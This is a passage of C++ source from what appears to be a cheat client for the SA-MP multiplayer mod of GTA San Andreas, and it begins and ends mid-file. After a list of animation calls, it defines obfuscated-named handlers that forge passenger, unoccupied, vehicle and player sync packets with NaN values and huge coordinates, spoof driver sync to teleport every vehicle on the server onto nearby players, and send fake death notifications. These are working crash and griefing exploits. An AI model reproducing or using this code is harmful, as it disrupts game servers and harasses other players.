	else if (anim == 19) GTAfunc_PerformAnimation("PARACHUTE", "PARA_Rip_Loop_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 20) GTAfunc_PerformAnimation("PARACHUTE", "PARA_Rip_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 21) GTAfunc_PerformAnimation("PARACHUTE", "PARA_steerL_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 22) GTAfunc_PerformAnimation("PARACHUTE", "PARA_steerR_O", -1, 1, 1, 0, 0, 1, 0, 1);

	// TATTOOS (23-41)
	else if (anim == 23) GTAfunc_PerformAnimation("TATTOOS", "TAT_ArmL_Out_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 24) GTAfunc_PerformAnimation("TATTOOS", "TAT_ArmL_Pose_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 25) GTAfunc_PerformAnimation("TATTOOS", "TAT_ArmR_In_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 26) GTAfunc_PerformAnimation("TATTOOS", "TAT_ArmR_Out_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 27) GTAfunc_PerformAnimation("TATTOOS", "TAT_ArmR_Pose_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 28) GTAfunc_PerformAnimation("TATTOOS", "TAT_Back_In_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 29) GTAfunc_PerformAnimation("TATTOOS", "TAT_Back_Out_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 30) GTAfunc_PerformAnimation("TATTOOS", "TAT_Back_Pose_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 31) GTAfunc_PerformAnimation("TATTOOS", "TAT_Bel_In_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 32) GTAfunc_PerformAnimation("TATTOOS", "TAT_Bel_Out_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 33) GTAfunc_PerformAnimation("TATTOOS", "TAT_Bel_Pose_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 34) GTAfunc_PerformAnimation("TATTOOS", "TAT_Che_In_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 35) GTAfunc_PerformAnimation("TATTOOS", "TAT_Che_Out_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 36) GTAfunc_PerformAnimation("TATTOOS", "TAT_Che_Pose_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 37) GTAfunc_PerformAnimation("TATTOOS", "TAT_Drop_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 38) GTAfunc_PerformAnimation("TATTOOS", "TAT_Idle_Loop_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 39) GTAfunc_PerformAnimation("TATTOOS", "TAT_Sit_In_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 40) GTAfunc_PerformAnimation("TATTOOS", "TAT_Sit_Loop_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 41) GTAfunc_PerformAnimation("TATTOOS", "TAT_Sit_Out_O", -1, 1, 1, 0, 0, 1, 0, 1);
	time = GetTickCount();
}}}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzzff()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131112z1111 == 1 )  
  { 
		
	/*struct actor_info *pInfo = actor_info_get(ACTOR_SELF, 0);
		struct vehicle_info	*vInfo = vehicle_info_get(ACTOR_SELF, -1);
		if (pInfo->state == ACTOR_STATE_DEAD || vInfo != NULL) return;
		if (pInfo != NULL)
		{
		pInfo->fCurrentRotation = -pGame->GetCamera()->GetCameraRotation();
		pInfo->fTargetRotation = pInfo->fCurrentRotation;
		pInfo->base.matrix[4] = sinf(-pInfo->fCurrentRotation);
		pInfo->base.matrix[5] = cosf(-pInfo->fCurrentRotation);
		}*/
		//pInfo->fCurrentRotation = (float)(rand() % 1000 * 1000 * 1000); // Michael Jackson Style
		//pInfo->fCurrentRotation = (float)(rand() % 100); // Lag Mode
		//pInfo->fCurrentRotation = (float)(rand() % 10); // Rotation

		// Position Lagger
		struct actor_info	*pInfo = actor_info_get(ACTOR_SELF, 0);
		struct vehicle_info *vInfo = vehicle_info_get(VEHICLE_SELF, 0);

		if (pInfo != NULL && vInfo == NULL)
		{
			static float fPos[3], lag = 0.2f;
			vect3_copy(&pInfo->base.matrix[4 * 3], fPos);

			// keyboard + optional_extra + mouse + joystic
			if (KEY_DOWN(pad(FORWARDS, KEYBOARD)) || KEY_DOWN(pad(FORWARDS, OPTIONAL_EXTRA)) ||
				KEY_DOWN(pad(FORWARDS, MOUSE)) || KEY_DOWN(pad(FORWARDS, JOYSTICK)))
			{
				int random = (rand() % (1 - 0 + 1) + 0);
				if (random == 0)
				{
					fPos[0] += sinf(-pInfo->fCurrentRotation) * lag;
					fPos[1] += cosf(-pInfo->fCurrentRotation) * lag;
				}
				else // 1
				{
					fPos[0] += sinf(-pInfo->fCurrentRotation) * (-lag);
					fPos[1] += cosf(-pInfo->fCurrentRotation) * (-lag);
				}
				cheat_actor_teleport(pInfo, fPos, gta_interior_id_get());
			}
			else if (KEY_DOWN(pad(BACKWARDS, KEYBOARD)) || KEY_DOWN(pad(BACKWARDS, OPTIONAL_EXTRA)) ||
				KEY_DOWN(pad(BACKWARDS, MOUSE)) || KEY_DOWN(pad(BACKWARDS, JOYSTICK)))
			{
				int random = (rand() % (1 - 0 + 1) + 0);
				if (random == 0)
				{
					fPos[0] += sinf(-pInfo->fCurrentRotation) * lag;
					fPos[1] += cosf(-pInfo->fCurrentRotation) * lag;
				}
				else // 1
				{
					fPos[0] += sinf(-pInfo->fCurrentRotation) * (-lag);
					fPos[1] += cosf(-pInfo->fCurrentRotation) * (-lag);
				}
				cheat_actor_teleport(pInfo, fPos, gta_interior_id_get());
			}
			else if (KEY_DOWN(pad(LEFT, KEYBOARD)) || KEY_DOWN(pad(LEFT, OPTIONAL_EXTRA)) ||
				KEY_DOWN(pad(LEFT, MOUSE)) || KEY_DOWN(pad(LEFT, JOYSTICK)))
			{
				int random = (rand() % (1 - 0 + 1) + 0);
				if (random == 0)
				{
					fPos[0] += sinf(-pInfo->fCurrentRotation) * lag;
					fPos[1] += cosf(-pInfo->fCurrentRotation) * lag;
				}
				else // 1
				{
					fPos[0] += sinf(-pInfo->fCurrentRotation) * (-lag);
					fPos[1] += cosf(-pInfo->fCurrentRotation) * (-lag);
				}
				cheat_actor_teleport(pInfo, fPos, gta_interior_id_get());
			}
			else if (KEY_DOWN(pad(RIGHT, KEYBOARD)) || KEY_DOWN(pad(RIGHT, OPTIONAL_EXTRA)) ||
				KEY_DOWN(pad(RIGHT, MOUSE)) || KEY_DOWN(pad(RIGHT, JOYSTICK)))
			{
				int random = (rand() % (1 - 0 + 1) + 0);
				if (random == 0)
				{
					fPos[0] += sinf(-pInfo->fCurrentRotation) * lag;
					fPos[1] += cosf(-pInfo->fCurrentRotation) * lag;
				}
				else // 1
				{
					fPos[0] += sinf(-pInfo->fCurrentRotation) * (-lag);
					fPos[1] += cosf(-pInfo->fCurrentRotation) * (-lag);
				}
				cheat_actor_teleport(pInfo, fPos, gta_interior_id_get());
			}
		}
				
	}
}



void SendEnterVehicles(USHORT VehicleID, BOOL bPassenger)
{
	 BitStream bsSend;
	bsSend.Write(VehicleID);
	bsSend.Write(bPassenger);
	g_DrifeitClient->RPC(RPC_EnterVehicle, &bsSend, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
}


void cheat_handle_picdddkmaasssssswqzzq141aa11121kk1czzzfm11()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasdddasas131112z111m == 1)
	{
		static DWORD time = GetTickCount();
		if (GetTickCount() - 570 > time)
		{
		SendWastedNotification(200, 1030);
		SendWastedNotification(201, 1030);
		time = GetTickCount();
		}
}
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzzfmm()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas131112z111mm == 1)
	{
		
			stPassengerData stPass = g_Players->pLocalPlayer->passengerData;
			stUnoccupiedData stUno;
			float zero = 0;
			static bool invertor = true;
			static bool invertor_sync = true;
			if (!invertor) stPass.byteSeatID = 1;
			else stPass.byteSeatID = 1;
			if (invertor_sync) {
				stPass.fPosition[0] = 20000000000;
				stPass.fPosition[1] = 20000000000;
			}
			 BitStream bs;
			bs.Write((BYTE)ID_PASSENGER_SYNC);
			bs.Write((PCHAR)&stPass, sizeof(stPassengerData));

			if (!invertor) stUno.byteSeatID = 1;
			else stUno.byteSeatID = 1;
			for (int i = 0; i < 3; i++)
				stUno.fPosition[i] = stPass.fPosition[i];
			stUno.fPosition[0] += 991000000597065728;
			stUno.fPosition[2] += 991000000597065728;
			stUno.sVehicleID = stPass.sVehicleID;
			stUno.fDirection[0] = sqrt((float)-1);
			stUno.fDirection[1] = 1;
			stUno.fDirection[2] = sqrt((float)-1);

			stUno.fRoll[0] = 1;
			stUno.fRoll[1] = sqrt((float)-1);
			stUno.fRoll[2] = sqrt((float)-1);

			stUno.fTurnSpeed[0] = 0;
			stUno.fTurnSpeed[1] = 0;
			stUno.fTurnSpeed[2] = 0;

			 BitStream bsUno;
			bsUno.Write((BYTE)ID_UNOCCUPIED_SYNC);
			bsUno.Write((PCHAR)&stUno, sizeof(stUnoccupiedData));

			g_DrifeitClient->Send(&bs, SYSTEM_PRIORITY, UNRELIABLE, 0);
			g_DrifeitClient->Send(&bsUno, SYSTEM_PRIORITY, UNRELIABLE, 0);
			invertor_sync ^= true;
			invertor ^= true;
		
	}
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzzfmmm()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas131112z111mmm == 1)
	{
		static DWORD time = GetTickCount();
		if (GetTickCount() - 700 > time)
		{
			//struct actor_info *self = actor_info_get(-1, ACTOR_ALIVE);
			for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			{
				if (g_Vehicles->iIsListed[v] != 1)
					continue;
				if (g_Vehicles->pSAMP_Vehicle[v] == NULL)
					continue;
				if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL)
					continue;
				int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				struct vehicle_info *info = vehicle_info_get(car_id, 0);
				struct actor_info *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);
				stPassengerData PassData = g_Players->pLocalPlayer->passengerData;
				//ZeroMemory(&PassData, sizeof(stPassengerData));
				memset(&PassData, 0, sizeof(stPassengerData));
				 BitStream bsVehicleSync;
				PassData.sVehicleID = v;

				PassData.fPosition[0] = 20000000000.20000000000f;
				PassData.fPosition[1] = 20000000000.20000000000f;
				PassData.fPosition[2] = 20000000000.20000000000f;
				//PassData.byteCurrentWeapon = WeaponID;
				//PassData.sKeys = key;
				PassData.byteSeatID = 1;
				PassData.byteHealth = self->hitpoints;
				PassData.byteArmor = self->armor;
				vect3_copy(&info->base.matrix[12], PassData.fPosition);
				bsVehicleSync.Write((BYTE)ID_PASSENGER_SYNC);
				bsVehicleSync.Write((PCHAR)&PassData, sizeof(stPassengerData));
				g_DrifeitClient->Send(&bsVehicleSync, SYSTEM_PRIORITY, UNRELIABLE, 0);
				

				stUnoccupiedData stUno;
				memset(&stUno, 0, sizeof(stUnoccupiedData));
				stUno.byteSeatID = 1;
				stUno.fPosition[0] = 991000000597065728;
				stUno.fPosition[2] = 991000000597065728;
				stUno.sVehicleID = v;
				stUno.fDirection[0];
				stUno.fDirection[1];
				stUno.fDirection[2];

				stUno.fRoll[0];
				stUno.fRoll[1];
				stUno.fRoll[2];

				stUno.fTurnSpeed[0];
				stUno.fTurnSpeed[1];
				stUno.fTurnSpeed[2];

				 BitStream bsUno;
				bsUno.Write((BYTE)ID_UNOCCUPIED_SYNC);
				bsUno.Write((PCHAR)&stUno, sizeof(stUnoccupiedData));
				g_DrifeitClient->Send(&bsUno, SYSTEM_PRIORITY, UNRELIABLE, 0);
				time = GetTickCount();
			}
		}
	}

}

int dssddsdsds = 0;
void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzzfmmmm()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas131112z111mmmm == 1)
	{
		
			static DWORD time3 = GetTickCount();
			if (GetTickCount() - 7000 > time3)
			{
				dssddsdsds = rand() % 4;
				time3 = GetTickCount();
			}
			stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData));

			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;

			if (dssddsdsds == 0)
			{
				onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0] + (float)(rand() % 3000);
				onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1] + (float)(rand() % 3000);
				onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2] + (float)(rand() % 100);
				dssddsdsds = 1;
			}
			if (dssddsdsds == 1)
			{
				onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0] - (float)(rand() % 3000);
				onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1] - (float)(rand() % 3000);
				onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2] - (float)(rand() % 100);
				dssddsdsds = 2;
			}
			if (dssddsdsds == 2)
			{
				onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0] + (float)(rand() % 3000);
				onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1] - (float)(rand() % 3000);
				onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2] - (float)(rand() % 100);
				dssddsdsds = 3;
			}
			if (dssddsdsds == 3)
			{
				onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0] - (float)(rand() % 3000);
				onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1] + (float)(rand() % 3000);
				onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2] - (float)(rand() % 100);
				dssddsdsds = 0;
			}
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0] + (float)(30);
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1] + (float)(30);
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2] + (float)(30);

			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0] - (float)(-30);
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1] - (float)(-30);
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2] - (float)(-30);

			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));

			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
			static DWORD time = GetTickCount();
			if (GetTickCount() - 300 > time)
			{
				float Pos[3] = { -1291.07 - rand() % 50, -161.95 - rand() % 50, 14.15f };
				//struct actor_info *self = actor_info_get(-1, ACTOR_ALIVE);
				for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
				{
					if (g_Vehicles->iIsListed[v] != 1)
						continue;
					if (g_Vehicles->pSAMP_Vehicle[v] == NULL)
						continue;
					if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL)
						continue;
					int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
					struct vehicle_info *info = vehicle_info_get(car_id, 0);
					stInCarData sync;
					 BitStream bsVehicleSync;
					memset(&sync, 0, sizeof(stInCarData));
					sync.sVehicleID = v;
					sync.fVehicleHealth = info->hitpoints;
					sync.fMoveSpeed[0] = info->speed[0];
					sync.fMoveSpeed[1] = info->speed[1];
					sync.fMoveSpeed[2] = info->speed[2];
					//sync.bytePlayerHealth = self->hitpoints;
					//sync.byteCurrentWeapon = self->armor;
					vect3_copy(&info->base.matrix[12], sync.fPosition);
					bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
					bsVehicleSync.Write((PCHAR)&sync, sizeof(stInCarData));
					g_DrifeitClient->Send(&bsVehicleSync, SYSTEM_PRIORITY, UNRELIABLE, 0);
					cheat_vehicle_teleport(info, Pos, 0);
					time = GetTickCount();
				}
			}
		}
	}




void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzzf()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131112z111 == 1 )  
  { 
		static DWORD time = GetTickCount();
		if (GetTickCount() - 300 > time)
		{
			//struct actor_info *self = actor_info_get(-1, ACTOR_ALIVE);
			for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			{
				if (g_Vehicles->iIsListed[v] != 1)
					continue;
				if (g_Vehicles->pSAMP_Vehicle[v] == NULL)
					continue;
				if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL)
					continue;
				int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				struct vehicle_info *info = vehicle_info_get(car_id, 0);
				stInCarData sync;
				 BitStream bsVehicleSync;
				memset(&sync, 0, sizeof(stInCarData));
				sync.sVehicleID = v;
				sync.fVehicleHealth = info->hitpoints;
				sync.fMoveSpeed[0] = info->speed[0];
				sync.fMoveSpeed[1] = info->speed[1];
				sync.fMoveSpeed[2] = info->speed[2];
				//sync.bytePlayerHealth = self->hitpoints;
				//sync.byteCurrentWeapon = self->armor;
				vect3_copy(&info->base.matrix[12], sync.fPosition);
				bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				bsVehicleSync.Write((PCHAR)&sync, sizeof(stInCarData));
				g_DrifeitClient->Send(&bsVehicleSync, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
				vehicle_setColor0(info, rand() % 255);
				vehicle_setColor1(info, rand() % 255);
				sendSCMEvent(3, v, rand() % 255, rand() % 255);
				time = GetTickCount();
			}
		}
				
	}
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzggfg()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas131112z111dsasd == 1)
	{
		
			static DWORD time = GetTickCount();
			if (GetTickCount() - 900 > time)
			{
				stPassengerData stPass = g_Players->pLocalPlayer->passengerData;
				stUnoccupiedData stUno;
				float zero = 0;
				stPass.byteSeatID = 1;
				stPass.fPosition[0] = 9500;
				stPass.fPosition[1] = 9500;
				 BitStream bs;
				bs.Write((BYTE)ID_PASSENGER_SYNC);
				bs.Write((PCHAR)&stPass, sizeof(stPassengerData));


				BYTE bNums[] = { 0, 1 };
				stUno.byteSeatID = bNums[random(0, sizeof(bNums))];
				for (int i = 0; i < 3; i++)
					stUno.fPosition[i] = stPass.fPosition[i];
				stUno.fPosition[0] += 991000000597065728;
				stUno.fPosition[2] += 991000000597065728;
				stUno.sVehicleID = stPass.sVehicleID;
				stUno.fDirection[0] = sqrt((float)-1);
				stUno.fDirection[1] = 1;
				stUno.fDirection[2] = sqrt((float)-1);

				stUno.fRoll[0] = 1;
				stUno.fRoll[1] = sqrt((float)-1);
				stUno.fRoll[2] = sqrt((float)-1);




				stUno.fTurnSpeed[0] = 0;
				stUno.fTurnSpeed[1] = 0;
				stUno.fTurnSpeed[2] = 0;

				 BitStream bsUno;
				bsUno.Write((BYTE)ID_UNOCCUPIED_SYNC);
				bsUno.Write((PCHAR)&stUno, sizeof(stUnoccupiedData));

				g_DrifeitClient->Send(&bs, SYSTEM_PRIORITY, UNRELIABLE, 0);
				g_DrifeitClient->Send(&bsUno, SYSTEM_PRIORITY, UNRELIABLE, 0);
				time = GetTickCount();
			
		}
	}
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzggfgdfdff()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas131112z111dsasdfdfdfd == 1)
	{
		
			static DWORD time = GetTickCount();
			if (GetTickCount() - 900 > time)
			{

				stPassengerData stPass = g_Players->pLocalPlayer->passengerData;
				stUnoccupiedData stUno;
				float zero = 0;
				stPass.byteSeatID = 1;
				stPass.fPosition[0] = 8500;
				stPass.fPosition[1] = 8500;
				 BitStream bs;
				bs.Write((BYTE)ID_PASSENGER_SYNC);
				bs.Write((PCHAR)&stPass, sizeof(stPassengerData));


				BYTE bNums[] = { 0, 1 };
				stUno.byteSeatID = bNums[random(0, sizeof(bNums))];
				for (int i = 0; i < 3; i++)
					stUno.fPosition[i] = stPass.fPosition[i];
				stUno.fPosition[0] += 8500;
				stUno.fPosition[2] += 8500;
				stUno.sVehicleID = stPass.sVehicleID;

				BYTE bNums2[] = { 100, 4000 };
				stUno.fDirection[0] = bNums2[random(0, sizeof(bNums2))];
				stUno.fDirection[1] = 1;
				stUno.fDirection[2] = bNums2[random(0, sizeof(bNums2))];

				BYTE bNums1[] = { 100, 4000 };
				stUno.fRoll[0] = 1;
				stUno.fRoll[1] = bNums1[random(0, sizeof(bNums1))];
				stUno.fRoll[2] = bNums1[random(0, sizeof(bNums1))];


				stUno.fTurnSpeed[0] = 0;
				stUno.fTurnSpeed[1] = 0;
				stUno.fTurnSpeed[2] = 0;

				 BitStream bsUno;
				bsUno.Write((BYTE)ID_UNOCCUPIED_SYNC);
				bsUno.Write((PCHAR)&stUno, sizeof(stUnoccupiedData));

				g_DrifeitClient->Send(&bs, SYSTEM_PRIORITY, UNRELIABLE, 0);
				g_DrifeitClient->Send(&bsUno, SYSTEM_PRIORITY, UNRELIABLE, 0);
				time = GetTickCount();
			}
		
	}
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzz()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131112z11 == 1 )  
  { 
		struct actor_info    *self = actor_info_get(ACTOR_SELF, -1);

		static DWORD time = GetTickCount();
		if (GetTickCount() - 300 > time)
		{
			for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			{
				if (g_Vehicles->iIsListed[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL) continue;

				int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

				int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
				if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID) continue;

				float fPos[3];
				vect3_copy(&self->base.matrix[4 * 3], fPos);

				fPos[0] += -50 + rand() % 100;
				fPos[1] += -50 + rand() % 100;
				fPos[2] += 20.0f;

				float fSpeed[3];
				fSpeed[0] = sinf(fPos[0]) * 5;
				fSpeed[1] = cosf(fPos[1]) * 5;

				SendFakeDriverSyncData(iSAMPVehicleID, fPos, vinfo->hitpoints, fSpeed, NULL);
				cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
				vinfo->speed[0] = fSpeed[0];
				vinfo->speed[1] = fSpeed[1];
			}
			time = GetTickCount();
		}
				
	}
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czz()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131112z1 == 1 )  
  { 
		struct actor_info    *self = actor_info_get(ACTOR_SELF, ACTOR_ALIVE);

		static DWORD time = GetTickCount();
		if (GetTickCount() - 300 > time)
		{
			for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			{
				if (g_Vehicles->iIsListed[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL) continue;

				int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

				int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
				if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID) continue;

				int r = 50; // radius of the circle
				float fPos[3];
				vect3_copy(&self->base.matrix[4 * 3], fPos);
				static int x = 0;
				fPos[0] += r * sin(180 * x / 3.1415);
				fPos[1] += r * cos(180 * x / 3.1415);
				x++;

				/*float fSpeed[3];
				fSpeed[0] = sinf(fPos[0]);
				fSpeed[1] = cosf(fPos[1]);*/

				SendFakeDriverSyncData(iSAMPVehicleID, fPos, vinfo->hitpoints, vinfo->speed, NULL);
				cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
				//vinfo->speed[0] = fSpeed[0];
				//vinfo->speed[1] = fSpeed[1];
			}

			time = GetTickCount();
		}	
				
	}
}




void cheat_handle_pickmaasssssswqzzq141aa11121kk1cz()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131112z == 1 )  
  { 
	int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;

		static DWORD time = GetTickCount();
		if (GetTickCount() - 300 > time)
		{
			for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			{
				if (g_Vehicles->iIsListed[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL) continue;

				int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

				int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
				if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID) continue;

				float fPos[3];
				vect3_copy(&nearest->base.matrix[4 * 3], fPos);

				fPos[2] += -50 + rand() % 100;

				SendFakeDriverSyncData(iSAMPVehicleID, fPos, vinfo->hitpoints, vinfo->speed, NULL);
				cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
			}
			time = GetTickCount();
		}
		
	
	}
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1c()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131112 == 1 )  
  { 
	int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;

		static int time = 0;
				if (GetTickCount() - 300 > time)
				{
			for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			{
				if (g_Vehicles->iIsListed[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v] == NULL) continue;
				if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL) continue;

				int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

				int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
				if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID) continue;

				float fPos[3];
				vect3_copy(&nearest->base.matrix[4 * 3], fPos);

				//fPos[2] += -50 + rand() % 100;
				fPos[2] += rand() % 10;

				float fSpeed[3];
				fSpeed[0] = sinf(fPos[0]) * 5;
				fSpeed[1] = cosf(fPos[1]) * 5;

				SendFakeDriverSyncData(iSAMPVehicleID, fPos, vinfo->hitpoints, fSpeed, NULL);
				cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
				vinfo->speed[0] = fSpeed[0];
				vinfo->speed[1] = fSpeed[1];
				time = GetTickCount();
				}
		}
	
	}
}



void cheat_handle_pickmaasssssswqzzq141aa11121kk1()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas13111 == 1 )  
  { 
	//GTAfunc_PerformAnimation("BIKED", "BIKEd_Back", -1, 1, 0, 0, 0, 1, 0, 1);  как вариант
	GTAfunc_PerformAnimation("BIKES", "BIKEs_Back",  22, 22, 22, 22, 22, 22, 22, 22); 
	//GTAfunc_PerformAnimation("CHOPPA", "CHOPPA_back", -1, 1, 0, 0, 0, 1, 0, 1);
	
	}
}
 



void cheat_handle_pickmaasssssswqzzq141aa111211xx1()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas1311 == 1 )  
  { 
	  stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth + 1000;// - sqrt((float)-1); 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor + 1000;;// - sqrt((float)-1); 
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0] + rand()%140;
